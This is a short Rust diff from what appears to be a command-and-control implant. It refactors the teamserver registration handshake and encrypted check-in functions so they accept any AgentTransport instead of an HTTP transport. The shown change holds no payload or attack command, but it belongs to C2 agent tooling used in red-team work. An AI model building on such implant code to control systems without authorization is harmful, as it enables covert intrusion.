@@ -34,8 +34,8 @@ pub fn decode_listener_pub_key(encoded: &str) -> Result<[u8; 32], SpecterError> 
 }
 
 /// Perform the ECDH registration handshake with the teamserver.
-pub async fn perform_registration(
-    transport: &HttpTransport,
+pub async fn perform_registration<T: AgentTransport>(
+    transport: &T,
     listener_pub_key: &[u8; 32],
     metadata: &[u8],
 ) -> Result<EcdhSession, SpecterError> {
@@ -47,8 +47,8 @@ pub async fn perform_registration(
 /// Encrypt a check-in payload with the session key and send it.
 ///
 /// Returns the decrypted server response payload.
-pub async fn send_session_packet(
-    transport: &HttpTransport,
+pub async fn send_session_packet<T: AgentTransport>(
+    transport: &T,
     session: &EcdhSession,
     payload: &[u8],
 ) -> Result<Vec<u8>, SpecterError> {
